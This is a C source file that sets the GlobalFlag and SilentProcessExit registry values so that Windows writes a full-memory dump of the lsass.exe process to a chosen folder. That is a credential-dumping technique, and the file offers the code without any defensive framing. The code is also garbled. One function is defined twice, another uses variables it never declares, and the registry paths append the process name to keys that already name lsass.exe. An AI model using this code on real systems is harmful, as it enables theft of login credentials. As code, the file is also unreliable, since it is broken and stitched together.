#include <Windows.h>
#include <stdio.h>
#include <DbgHelp.h>


#define IFEO_REG_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe"
#define SILENT_PROCESS_EXIT_REG_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe"

BOOL SetRegSilentProcessExit(LPCSTR dumpFolder, LPCSTR processName) {
	BOOL m_isValid = FALSE; // Defaults to FALSE
	HKEY m_hIFEORegKey;
	HKEY m_hSPERegKey;
	char* subkeyIFEO_P;
	char* subkeySPE_P;


	subkeyIFEO_P = (char*)malloc(MAX_PATH);
	if (subkeyIFEO_P == NULL)
		return FALSE;
	subkeySPE_P = (char*)malloc(MAX_PATH);
	if (subkeySPE_P == NULL) {
		free(subkeyIFEO_P);
		return FALSE;
	}
	sprintf_s(subkeyIFEO_P, MAX_PATH, "%s\\%s", IFEO_REG_KEY, processName);
	sprintf_s(subkeySPE_P, MAX_PATH, "%s\\%s", SILENT_PROCESS_EXIT_REG_KEY, processName);


	if (RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeyIFEO_P, &m_hIFEORegKey) != ERROR_SUCCESS) {
		free(subkeySPE_P);
		free(subkeyIFEO_P);
		return FALSE;

	}
	// https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
	DWORD globalFlagData = FLG_MONITOR_SILENT_PROCESS_EXIT;
	if (RegSetValueExA(m_hIFEORegKey, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlagData, sizeof(DWORD)) != ERROR_SUCCESS) {
		RegCloseKey(m_hIFEORegKey);
		free(subkeySPE_P);
		free(subkeyIFEO_P);
		return FALSE;

	}
	RegCloseKey(m_hIFEORegKey);


	BOOL ret;
	DWORD ReportingMode = MiniDumpWithFullMemory;
	DWORD DumpType = LOCAL_DUMP;
	if (RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeySPE_P, &m_hSPERegKey) != ERROR_SUCCESS) {
		free(subkeySPE_P);
		free(subkeyIFEO_P);
		return FALSE;
	}

	// Set SilentProcessExit registry values for the target process
	ret = RegSetValueExA(m_hSPERegKey, "ReportingMode", 0, REG_DWORD, (const BYTE*)&ReportingMode, sizeof(DWORD)) == ERROR_SUCCESS;
	ret &= RegSetValueExA(m_hSPERegKey, "LocalDumpFolder", 0, REG_SZ, (const BYTE*)dumpFolder, (DWORD)strlen(dumpFolder) + 1) == ERROR_SUCCESS;
	ret &= RegSetValueExA(m_hSPERegKey, "DumpType", 0, REG_DWORD, (const BYTE*)&DumpType, sizeof(DWORD)) == ERROR_SUCCESS;

	RegCloseKey(m_hSPERegKey);
	free(subkeySPE_P);
	free(subkeyIFEO_P);
	return ret;
}





BOOL SetRegGlobalFlag(LPCSTR dumpFolder, LPCSTR processName) {
	BOOL m_isValid = FALSE; // Defaults to FALSE
	HKEY m_hIFEORegKey;
	char* subkeySPE_P;


	subkeySPE_P = (char*)malloc(MAX_PATH);
	if (subkeySPE_P == NULL) {
		free(subkeyIFEO_P);
		return FALSE;
	}
	sprintf_s(subkeySPE_P, MAX_PATH, "%s\\%s", SILENT_PROCESS_EXIT_REG_KEY, processName);


	if (RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeyIFEO_P, &m_hIFEORegKey) != ERROR_SUCCESS) {
		free(subkeyIFEO_P);
		return FALSE;

	}
	// https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-flag-table
	DWORD globalFlagData = FLG_MONITOR_SILENT_PROCESS_EXIT;
	if (RegSetValueExA(m_hIFEORegKey, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlagData, sizeof(DWORD)) != ERROR_SUCCESS) {
		RegCloseKey(m_hIFEORegKey);
		free(subkeyIFEO_P);
		return FALSE;

	}
	RegCloseKey(m_hIFEORegKey);
	free(subkeyIFEO_P);
	return ret;
}
BOOL SetRegSilentProcessExit(LPCSTR dumpFolder, LPCSTR processName) {
	BOOL m_isValid = FALSE; // Defaults to FALSE
	HKEY m_hIFEORegKey;
	HKEY m_hSPERegKey;
	char* subkeySPE_P;
	BOOL ret;
	DWORD ReportingMode = MiniDumpWithFullMemory;
	DWORD DumpType = LOCAL_DUMP;

	subkeySPE_P = (char*)malloc(MAX_PATH);
	if (subkeySPE_P == NULL) {
		return FALSE;
	}
	sprintf_s(subkeySPE_P, MAX_PATH, "%s\\%s", SILENT_PROCESS_EXIT_REG_KEY, processName);
	if (RegCreateKeyA(HKEY_LOCAL_MACHINE, subkeySPE_P, &m_hSPERegKey) != ERROR_SUCCESS) {
		free(subkeySPE_P);
		return FALSE;
	}
	// Set SilentProcessExit registry values for the target process
	ret = RegSetValueExA(m_hSPERegKey, "ReportingMode", 0, REG_DWORD, (const BYTE*)&ReportingMode, sizeof(DWORD)) == ERROR_SUCCESS;
	ret &= RegSetValueExA(m_hSPERegKey, "LocalDumpFolder", 0, REG_SZ, (const BYTE*)dumpFolder, (DWORD)strlen(dumpFolder) + 1) == ERROR_SUCCESS;
	ret &= RegSetValueExA(m_hSPERegKey, "DumpType", 0, REG_DWORD, (const BYTE*)&DumpType, sizeof(DWORD)) == ERROR_SUCCESS;

	RegCloseKey(m_hSPERegKey);
	free(subkeySPE_P);
	return ret;
}